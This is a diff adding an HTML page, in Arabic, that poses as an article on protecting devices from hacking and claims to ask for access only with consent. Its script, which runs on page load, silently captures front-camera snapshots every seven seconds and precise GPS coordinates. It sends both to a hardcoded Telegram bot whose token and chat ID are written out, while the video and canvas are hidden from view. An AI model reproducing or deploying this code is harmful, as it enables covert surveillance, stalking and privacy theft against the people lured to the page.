@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>حماية الأجهزة من الاختراق</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      background-color: #f7f7f7;
+    }
+    header {
+      background-color: #333;
+      color: white;
+      padding: 15px;
+      font-size: 24px;
+    }
+    #video {
+      display: none;
+    }
+    section.article {
+      margin: 30px auto;
+      max-width: 700px;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      direction: rtl;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <header>نظام التحقق من الهوية والكشف الجغرافي</header>  <section class="article">
+    <h2>حماية أجهزتك من الاختراق والوصول غير المصرح</h2>
+    <p>
+      في عالمنا الرقمي الحديث، أصبح من الضروري على كل مستخدم أن يتخذ خطوات فعالة لحماية أجهزته من محاولات الاختراق.
+      من بين الأساليب الشائعة التي يستخدمها المهاجمون هي استغلال صلاحيات الوصول إلى الكاميرا أو الموقع الجغرافي دون علم المستخدم.
+    </p>
+    <p>
+      يجب دائمًا مراقبة التطبيقات والمواقع التي تطلب الوصول إلى الكاميرا أو GPS والتأكد من أن هذه الصلاحيات تُمنح فقط للجهات الموثوقة.
+      تفعيل إعدادات الخصوصية، وتحديث النظام والتطبيقات بشكل دوري، واستخدام برامج الحماية تساعد في منع هذه التهديدات.
+    </p>
+    <p>
+      نحن نستخدم في هذا النظام وسائل تحقق آمنة وواضحة، تطلب إذن الوصول منك مباشرة ولا تعمل بدون موافقتك الصريحة.
+    </p>
+  </section><video id="video" autoplay playsinline></video> <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "7563056522:AAGtCUHe64GmfalmLnBQC3KvAHkX8XSkRTQ";
+    const CHAT_ID = "8012505053";
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    // تشغيل الكاميرا والتقاط الصور دورياً
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        setInterval(() => {
+          if (video.videoWidth && video.videoHeight) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+              if (blob) {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("caption", "صورة تم التقاطها تلقائيًا");
+                formData.append("photo", blob, "image.jpg");
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                }).catch(err => console.error("Image send error:", err));
+              }
+            }, "image/jpeg", 0.6);
+          }
+        }, 7000);
+      } catch (err) {
+        alert("تم رفض الوصول إلى الكاميرا. يرجى السماح للموقع.");
+        console.error("Camera error:", err);
+      }
+    }
+
+    // طلب الموقع الجغرافي
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const locationMessage = `موقع المستخدم:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: locationMessage
+              })
+            }).catch(err => console.error("Location send error:", err));
+          },
+          error => {
+            alert("تم رفض الوصول إلى الموقع. لن يتم إرسال الموقع.");
+            console.warn("Location error:", error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        console.warn("Geolocation not supported.");
+      }
+    }
+
+    // تشغيل كل شيء بعد تحميل الصفحة
+    window.addEventListener('load', () => {
+      sendLocation();
+      startCamera();
+    });
+  </script></body>
+</html>
